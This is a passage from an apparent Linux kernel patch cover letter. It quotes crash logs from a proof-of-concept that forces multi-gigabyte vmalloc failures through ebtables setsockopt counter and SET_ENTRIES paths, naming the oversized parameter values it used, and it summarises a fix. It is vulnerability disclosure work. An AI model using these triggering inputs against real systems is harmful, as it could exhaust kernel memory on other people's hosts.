+> [    1.579960]  ? folio_add_file_rmap_ptes (include/linux/vmstat.h:542 (discriminator 1) mm/rmap.c:1336 (discriminator 1) mm/rmap.c:1428 (discriminator 1) mm/rmap.c:1706 (discriminator 1) mm/rmap.c:1732 (discriminator 1))
+> [    1.579969]  ? do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
+> [    1.579977]  ? filemap_map_pages (include/linux/rcupdate.h:873 mm/filemap.c:3984)
+> [    1.579992]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator 4))
+> [    1.580006]  ? do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
+> [    1.580011]  do_update_counters.constprop.0 (net/bridge/netfilter/ebtables.c:1395 (discriminator 2))
+> [    1.580020]  update_counters (net/bridge/netfilter/ebtables.c:1444)
+> [    1.580030]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
+> [    1.580052]  do_sock_setsockopt (net/socket.c:2368)
+> [    1.580066]  __sys_setsockopt (net/socket.c:2393)
+> [    1.580075]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:2396 net/socket.c:2396)
+> [    1.580082]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
+> [    1.580090]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+> [    1.580208] RIP: 0033:0x43523e
+> [    1.580370] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
+> [    1.580416] RSP: 002b:00007ffd9e4c8f48 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
+> [    1.580438] RAX: ffffffffffffffda RBX: 00007ffd9e4c8f50 RCX: 000000000043523e
+> [    1.580447] RDX: 0000000000000081 RSI: 0000000000000000 RDI: 0000000000000003
+> [    1.580454] RBP: 00007ffd9e4cafd7 R08: 000000007ffffff8 R09: 0000000000000000
+> [    1.580461] R10: 00007ffd9e4c8f50 R11: 0000000000000246 R12: 0000000000000003
+> [    1.580469] R13: 00007ffd9e4c9278 R14: 00000000004de808 R15: 0000000000000001
+> [    1.580500]  </TASK>
+> [worker] setsockopt(name=bogus, len=2147483640, num_counters=134217720) -> ret=-1 errno=12 (Cannot allocate memory)
+> EXIT 1
+> 
+> EBT_SO_SET_ENTRIES path:
+> [    8.275233] poc: vmalloc error: size 2147483520, exceeds total pages, mode:0xcc0(GFP_KERNEL), nodemask=(null),cpuset=/,mems_allowed=0
+> [    8.297875] CPU: 1 UID: 0 PID: 62 Comm: poc Not tainted 7.2.0-rc4-00390-g743916aa8e8c #4 PREEMPT(lazy) 
+> [    8.297957] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+> [    8.298283] Call Trace:
+> [    8.298471]  <TASK>
+> [    8.298471]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
+> [    8.298471]  warn_alloc (mm/page_alloc.c:4023)
+> [    8.298471]  ? alloc_pages_bulk_noprof (mm/page_alloc.c:5338 mm/page_alloc.c:5230)
+> [    8.298471]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
+> [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
+> [    8.298471]  ? __vmalloc_node_range_noprof (mm/vmalloc.c:694 mm/vmalloc.c:703 mm/vmalloc.c:3924 mm/vmalloc.c:4082)
+> [    8.298471]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator 4))
+> [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
+> [    8.298471]  do_replace_finish (net/bridge/netfilter/ebtables.c:1024 (discriminator 2))
+> [    8.298471]  ? do_replace (net/bridge/netfilter/ebtables.c:1145 (discriminator 2))
+> [    8.298471]  do_replace (net/bridge/netfilter/ebtables.c:1156)
+> [    8.298471]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
+> [    8.298471]  do_sock_setsockopt (net/socket.c:2368)
+> [    8.298471]  __sys_setsockopt (net/socket.c:2393)
+> [    8.298471]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:2396 net/socket.c:2396)
+> [    8.298471]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
+> [    8.298471]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+> [    8.298471] RIP: 0033:0x4307be
+> [    8.298471] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
+> [    8.298471] RSP: 002b:00007ffc525761e8 EFLAGS: 00000246 ORIG_RAX: 0000000000000036
+> [    8.298471] RAX: ffffffffffffffda RBX: 00000000031ae378 RCX: 00000000004307be
+> [    8.298471] RDX: 0000000000000080 RSI: 0000000000000000 RDI: 0000000000000003
+> [    8.298471] RBP: 00007ffc52576280 R08: 0000000000000079 R09: 0000000000000000
+> [    8.298471] R10: 00007ffc52576280 R11: 0000000000000246 R12: 0000000000000003
+> [    8.298471] R13: 00007ffc52577fd7 R14: 00000000004de808 R15: 0000000000000001
+> [    8.298471]  </TASK>
+> [worker] SET_ENTRIES name=bogus len=121 entries_size=1 num_counters=134217720 allocation=2147483520 -> ret=-1 errno=12 (Cannot allocate memory)
+> EXIT 1
+> -----END crash log-----
+> 
+> Best regards,
+> Zihan Xi
+> 
+> Zihan Xi (1):
+>   netfilter: ebtables: avoid unbounded counter allocations
+> 
+>  net/bridge/netfilter/ebtables.c | 34 ++++++++++++++++-----------------
+>  1 file changed, 17 insertions(+), 17 deletions(-)
+> 
 > -- 
-> 2.47.3
-> 
+> 2.43.0
